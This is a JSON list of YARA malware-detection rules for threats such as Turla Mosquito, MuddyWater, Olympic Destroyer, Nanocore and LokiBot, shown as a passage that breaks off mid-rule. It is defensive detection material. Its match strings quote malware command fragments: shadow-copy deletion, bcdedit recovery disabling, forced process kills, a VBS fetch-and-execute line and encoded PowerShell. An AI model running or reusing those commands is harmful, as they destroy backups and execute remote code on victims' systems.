Honeybee","minimum_yara":"1.7","name":"HoneyBee_Dropper_MalDoc_RID2FEA","reference":"https://goo.gl/JAHZVL","required_modules":[],"rule_hash":"29d1b5c8ab49aaeb6b5f27dcbaf6f555","score":75,"tags":["T1057","T1035","T1047","MAL","DEMO","FILE","APT"]},{"author":"Florian Roth","content":"rule OpHoneybee_Malware_1_RID2EB7 : APT DEMO EXE FILE MAL T1035 T1082 {\n   meta:\n      description = \"Detects malware from Operation Honeybee\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/JAHZVL\"\n      date = \"2018-03-03 11:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1035, T1082\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd /c taskkill /im cliconfg.exe /f /t && del /f /q\" fullword ascii\n      $x2 = \"\\\\FTPCom_vs10\\\\Release\\\\Engine.pdb\" ascii\n      $x3 = \"KXU/yP=B29tLzidqNRuf-SbVInw0oCrmWZk6OpFc7A5GTD1QxaJ3H8h4jMeEsYglv\" fullword ascii\n      $x4 = \"D:\\\\Task\\\\MiMul\\\\\" ascii\n      $s1 = \"[DLL_PROCESS_ATTACH]\" fullword ascii\n      $s2 = \"cmd /c systeminfo >%s\" fullword ascii\n      $s3 = \"post.txt\" fullword ascii\n      $s4 = \"\\\\temp.ini\" fullword ascii\n      $s5 = \"[GetFTPAccountInfo_10001712]\" fullword ascii\n      $s6 = \"ComSysAppMutex\" fullword ascii\n      $s7 = \"From %s (%02d-%02d %02d-%02d-%02d).txt\" fullword ascii\n      $s8 = \"%s %s %c%s%c\" fullword ascii\n      $s9 = \"TO EVERYONE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"e14b59a79999cc0bc589a4cb5994692a\" or pe.imphash ( ) == \"64400f452e2f60305c341e08f217b02c\" or 1 of ( $x* ) or 3 of them )\n}","date":"2018-03-03 11:26:21","description":"Detects malware from Operation Honeybee","minimum_yara":"1.7","name":"OpHoneybee_Malware_1_RID2EB7","reference":"https://goo.gl/JAHZVL","required_modules":["pe"],"rule_hash":"7881e4978955201f7067ebb33092360a","score":75,"tags":["T1035","MAL","DEMO","FILE","APT","T1082","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_Trojan_Loader_Feb18_1_RID315E : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Sofacy Activity Feb 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100\"\n      date = \"2018-03-01 13:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%appdata%\\\\nad.dll\" fullword wide\n      $s3 = \"%appdata%\\\\nad.bat\" fullword wide\n      $s1 = \"apds.dll\" fullword ascii\n      $s2 = \"nad.dll\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"a2d1be6502b4b3c28959a4fb0196ea45\" or pe.exports ( \"VidBitRpl\" ) or 1 of ( $x* ) or 2 of them )\n}","date":"2018-03-01 13:19:31","description":"Sofacy Activity Feb 2018","minimum_yara":"1.7","name":"Sofacy_Trojan_Loader_Feb18_1_RID315E","reference":"https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100","required_modules":["pe"],"rule_hash":"236d4994c0251bf578f3f9e417958616","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MuddyWater_Mal_Doc_Feb18_1_RID306A : DEMO FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects malicious document used by MuddyWater\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - TI2T\"\n      date = \"2018-02-26 12:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmco\" ascii\n      $x2 = \"U1FCdUFIWUFid0JyQUdVQUxRQkZBSGdBY0FCeUFHVUFjd0J6QUdrQWJ3QnVBQ0FBS\" \n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 1 of them\n}","date":"2018-02-26 12:38:51","description":"Detects malicious document used by MuddyWater","minimum_yara":"1.7","name":"MuddyWater_Mal_Doc_Feb18_1_RID306A","reference":"Internal Research - TI2T","required_modules":[],"rule_hash":"65b44ffc1dd6af4c8e33554c92f3e976","score":75,"tags":["DEMO","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule MuddyWater_Mal_Doc_Feb18_2_RID306B : DEMO FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects malicious document used by MuddyWater\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - TI2T\"\n      date = \"2018-02-26 12:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"*\\\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\\\Windows\\\\System32\\\\stdole2.tlb#OLE Automation\" fullword wide\n      $s2 = \"*\\\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\OFFICE16\\\\MSO.DLL#Microsoft \" wide\n      $s3 = \"*\\\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\\\Program Files\\\\Microsoft Office\\\\Office16\\\\MSWORD.OLB#Microsoft Word 16.0 O\" wide\n      $s4 = \"scripting.filesystemobject$\" fullword ascii\n      $s5 = \"ID=\\\"{00000000-0000-0000-0000-000000000000}\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 6000KB and all of them\n}","date":"2018-02-26 12:39:01","description":"Detects malicious document used by MuddyWater","minimum_yara":"1.7","name":"MuddyWater_Mal_Doc_Feb18_2_RID306B","reference":"Internal Research - TI2T","required_modules":[],"rule_hash":"a7ca4dcae7f011a0b66df15815fc0db1","score":75,"tags":["DEMO","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule IceFog_Malware_Feb18_1_RID2ECB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects IceFog malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ClearskySec/status/968104465818669057\"\n      date = \"2018-02-26 11:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c %c%s%c\" fullword ascii\n      $s2 = \"temp.bat\" fullword ascii\n      $s3 = \"c:\\\\windows\\\\debug\\\\wia\\\\help\" fullword wide\n      $s4 = \"/getorder.aspx?hostname=\" fullword wide\n      $s5 = \"\\\\filecfg_temp.dat\" fullword wide\n      $s6 = \"Unknown operating system \" fullword wide\n      $s7 = \"kastygost.compress.to\" fullword wide\n      $s8 = \"/downloads/\" fullword wide\n      $s9 = \"\\\\key.dat\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them\n}","date":"2018-02-26 11:29:41","description":"Detects IceFog malware","minimum_yara":"1.7","name":"IceFog_Malware_Feb18_1_RID2ECB","reference":"https://twitter.com/ClearskySec/status/968104465818669057","required_modules":[],"rule_hash":"de5380f0d6d32d59c4f94a3020ca072c","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_1_RID2E83 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:17:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Pipetp\" fullword ascii\n      $s2 = \"EStOpnabn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == \"169d4237c79549303cca870592278f42\" or all of them )\n}","date":"2018-02-22 11:17:41","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_1_RID2E83","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":["pe"],"rule_hash":"727f55bfcaece96cce1b1522e761beb9","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_2_RID2E84 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFileNameParseException@ExecuteFile@@\" fullword ascii\n      $s3 = \"no_address\" fullword wide\n      $s6 = \"SRRRQP\" fullword ascii\n      $s7 = \"QWVPQQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"cd918073f209c5da7a16b6c125d73746\" or all of them )\n}","date":"2018-02-22 11:17:51","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_2_RID2E84","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":["pe"],"rule_hash":"e61b480ad856a1c9faa3fbe05d4c89da","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_3_RID2E85 : DEMO EXE FILE MAL RUSSIA T1047 {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA, T1047\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"InstructionerDLL.dll\" fullword ascii\n      $s1 = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" fullword wide\n      $s2 = \"/scripts/m/query.php?id=\" fullword wide\n      $s3 = \"SELECT * FROM AntiVirusProduct\" fullword ascii\n      $s4 = \"Microsoft Update\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"88488fe0b8bcd6e379dea6433bb5d7d8\" or ( pe.exports ( \"InstallRoutineW\" ) and pe.exports ( \"StartRoutine\" ) ) or $x1 or 3 of them )\n}","date":"2018-02-22 11:18:01","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_3_RID2E85","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":["pe"],"rule_hash":"1072204aa49b4b53d643bbd0e1cb53ba","score":75,"tags":["T1047","MAL","DEMO","FILE","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_4_RID2E86 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and pe.imphash ( ) == \"17b328245e2874a76c2f46f9a92c3bad\"\n}","date":"2018-02-22 11:18:11","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_4_RID2E86","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":["pe"],"rule_hash":"05eeef2b4696db27aaee7b10fd75943f","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_5_RID2E87 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == \"ac40cf7479f53a4754ac6481a4f24e57\"\n}","date":"2018-02-22 11:18:21","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_5_RID2E87","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":["pe"],"rule_hash":"363f83194e110f17a877fd70ecf582d6","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_6_RID2E88 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"/scripts/m/query.php?id=\" fullword wide\n      $a2 = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" fullword wide\n      $a3 = \"GetUserNameW fails\" fullword wide\n      $s1 = \"QVSWQQ\" fullword ascii\n      $s2 = \"SRRRQP\" fullword ascii\n      $s3 = \"QSVVQQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 2 of ( $a* ) or 4 of them )\n}","date":"2018-02-22 11:18:31","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_6_RID2E88","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":[],"rule_hash":"2cd1317774544fb2db23fd0a3b21b481","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TurlaMosquito_Mal_7_RID2E89 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Logger32.dll\" fullword ascii\n      $s6 = \"lManager::Execute : CPalExceptio\" fullword wide\n      $s19 = \"CCommandSender::operator(\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"073235ae6dfbb1bf5db68a039a7b7726\" or 3 of them )\n}","date":"2018-02-22 11:18:41","description":"Detects malware sample from Turla Mosquito report","minimum_yara":"1.7","name":"TurlaMosquito_Mal_7_RID2E89","reference":"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","required_modules":["pe"],"rule_hash":"97c3c889e4e17cb4ef3f37b075d039ee","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Nanocore_RAT_Feb18_1_RID2DF1 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Nanocore RAT\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - T2T\"\n      date = \"2018-02-19 10:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NanoCore Client.exe\" fullword ascii\n      $x2 = \"NanoCore.ClientPluginHost\" fullword ascii\n      $s1 = \"PluginCommand\" fullword ascii\n      $s2 = \"FileCommand\" fullword ascii\n      $s3 = \"PipeExists\" fullword ascii\n      $s4 = \"PipeCreated\" fullword ascii\n      $s5 = \"IClientLoggingHost\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 5 of them )\n}","date":"2018-02-19 10:53:21","description":"Detects Nanocore RAT","minimum_yara":"1.7","name":"Nanocore_RAT_Feb18_1_RID2DF1","reference":"Internal Research - T2T","required_modules":[],"rule_hash":"8a0692ead01eb2443c63e8f9465fb41d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Nanocore_RAT_Feb18_2_RID2DF2 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Nanocore RAT\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - T2T\"\n      date = \"2018-02-19 10:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ResManagerRunnable\" fullword ascii\n      $s2 = \"TransformRunnable\" fullword ascii\n      $s3 = \"MethodInfoRunnable\" fullword ascii\n      $s4 = \"ResRunnable\" fullword ascii\n      $s5 = \"RunRunnable\" fullword ascii\n      $s6 = \"AsmRunnable\" fullword ascii\n      $s7 = \"ReadRunnable\" fullword ascii\n      $s8 = \"ExitRunnable\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2018-02-19 10:53:31","description":"Detects Nanocore RAT","minimum_yara":"1.7","name":"Nanocore_RAT_Feb18_2_RID2DF2","reference":"Internal Research - T2T","required_modules":[],"rule_hash":"ec22f3fcb9f9df23bee3964998dba62d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule LokiBot_Dropper_ScanCopyPDF_Feb18_RID332E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Semiautomatic generated rule - file Scan Copy.pdf.com\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5\"\n      date = \"2018-02-14 14:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Win32           Scan Copy.pdf   \" fullword wide\n      $a1 = \"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\VB98\\\\VB6.OLB\" fullword ascii\n      $s1 = \"Compiling2.exe\" fullword wide\n      $s2 = \"Unstalled2\" fullword ascii\n      $s3 = \"Compiling.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $x1 or ( $a1 and 1 of ( $s* ) )\n}","date":"2018-02-14 14:36:51","description":"Semiautomatic generated rule - file Scan Copy.pdf.com","minimum_yara":"1.7","name":"LokiBot_Dropper_ScanCopyPDF_Feb18_RID332E","reference":"https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5","required_modules":[],"rule_hash":"fe9c3814d17893126261d25e0749c8c6","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule LokiBot_Dropper_Packed_R11_Feb18_RID328F : DEMO FILE MAL T1045 {\n   meta:\n      description = \"Semiautomatic generated rule - file scan copy.pdf.r11\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5\"\n      date = \"2018-02-14 14:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, T1045\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\VB98\\\\VB6.OLB\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x0000 and filesize < 2000KB and 1 of them\n}","date":"2018-02-14 14:10:21","description":"Semiautomatic generated rule - file scan copy.pdf.r11","minimum_yara":"1.7","name":"LokiBot_Dropper_Packed_R11_Feb18_RID328F","reference":"https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5","required_modules":[],"rule_hash":"0a940418920de069813e9b22e0d61056","score":75,"tags":["DEMO","T1045","FILE","MAL"]},{"author":"Florian Roth","content":"rule HawkEye_Keylogger_Feb18_1_RID302C : DEMO EXE FILE MAL T1056 {\n   meta:\n      description = \"Semiautomatic generated rule - file bb58922ad8d4a638e9d26076183de27fb39ace68aa7f73adc0da513ab66dc6fa\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/ae2521dd-61aa-4bc7-b0d8-8c85ddcbfcc9\"\n      date = \"2018-02-12 12:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UploadReportLogin.asmx\" fullword wide\n      $s2 = \"tmp.exe\" fullword wide\n      $s3 = \"%appdata%\\\\\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2018-02-12 12:28:31","description":"Semiautomatic generated rule - file bb58922ad8d4a638e9d26076183de27fb39ace68aa7f73adc0da513ab66dc6fa","minimum_yara":"1.7","name":"HawkEye_Keylogger_Feb18_1_RID302C","reference":"https://app.any.run/tasks/ae2521dd-61aa-4bc7-b0d8-8c85ddcbfcc9","required_modules":[],"rule_hash":"71cd95d98cd9b233bd6a88a9362ff61f","score":75,"tags":["T1056","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Destructive_Ransomware_Gen1_RID31CB : CRIME DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects destructive malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"\n      date = \"2018-02-12 13:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\" fullword wide\n      $x2 = \"delete shadows /all /quiet\" fullword wide\n      $x3 = \"delete catalog -quiet\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}","date":"2018-02-12 13:37:41","description":"Detects destructive malware","minimum_yara":"1.7","name":"Destructive_Ransomware_Gen1_RID31CB","reference":"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html","required_modules":[],"rule_hash":"b62321e394fe16b344868a2b3409fd1c","score":75,"tags":["DEMO","CRIME","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OlympicDestroyer_Gen2_RID2F5A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Olympic Destroyer malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"\n      date = \"2018-02-12 11:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c (ping 0.0.0.0 > nul) && if exist %programdata%\\\\evtchk.txt\" fullword wide\n      $x2 = \"cmd.exe /c (echo strPath = Wscript.ScriptFullName & echo.Set FSO = CreateObject^(\\\"Scripting.FileSystemObject\\\"^)\" wide\n      $x3 = \"del %programdata%\\\\evtchk.txt\" fullword wide\n      $x4 = \"Pyeongchang2018.com\\\\svc_all_swd_installc\" fullword ascii\n      $s1 = \"<STARTCRED>\" fullword wide\n      $s2 = \"SELECT ds_cn FROM ds_computer\" fullword wide\n      $s3 = \"\\\\system32\\\\notepad.exe\" fullword wide\n      $s4 = \"%s \\\\\\\\%s -u \\\"%s\\\" -p \\\"%s\\\" -accepteula -d %s %s \\\"%s\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == \"fd7200dcd5c0d9d4d277a26d951210aa\" or pe.imphash ( ) == \"975087e9286238a80895b195efb3968d\" or pe.imphash ( ) == \"da1c2d7acfe54df797bfb1f470257bc3\" or 1 of ( $x* ) or 3 of them )\n}","date":"2018-02-12 11:53:31","description":"Detects Olympic Destroyer malware","minimum_yara":"1.7","name":"OlympicDestroyer_Gen2_RID2F5A","reference":"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html","required_modules":["pe"],"rule_hash":"019f7cd4eb025b029cc70805cad64fdd","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule VBS_Obfuscated_Mal_Feb18_1_RID3039 : DEMO OBFUS SCRIPT T1027 T1064 {\n   meta:\n      description = \"Detects malicious obfuscated VBS observed in February 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/zPsn83\"\n      date = \"2018-02-12 12:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OBFUS, SCRIPT, T1027, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"A( Array( (1* 2^1 )+\" ascii\n      $x2 = \".addcode(A( Array(\" ascii\n      $x3 = \"false:AA.send:Execute(AA.responsetext):end\" ascii\n      $x4 = \"& A( Array(  (1* 2^1 )+\" ascii\n      $s1 = \".SYSTEMTYPE:NEXT:IF (UCASE(\" ascii\n      $s2 = \"A = STR:next:end function\" ascii\n      $s3 = \"&WSCRIPT.SCRIPTFULLNAME&CHR\" fullword ascii\n   condition: \n      filesize < 600KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2018-02-12 12:30:41","description":"Detects malicious obfuscated VBS observed in February 2018","minimum_yara":"1.7","name":"VBS_Obfuscated_Mal_Feb18_1_RID3039","reference":"https://goo.gl/zPsn83","required_modules":[],"rule_hash":"fbf6d1d25ee8ee07562fac5e81687dfa","score":75,"tags":["DEMO","T1064","T1027","SCRIPT","OBFUS"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_lsls_RID2FCC : DEMO FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyberintproject/status/961714165550342146\"\n      date = \"2018-02-08 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   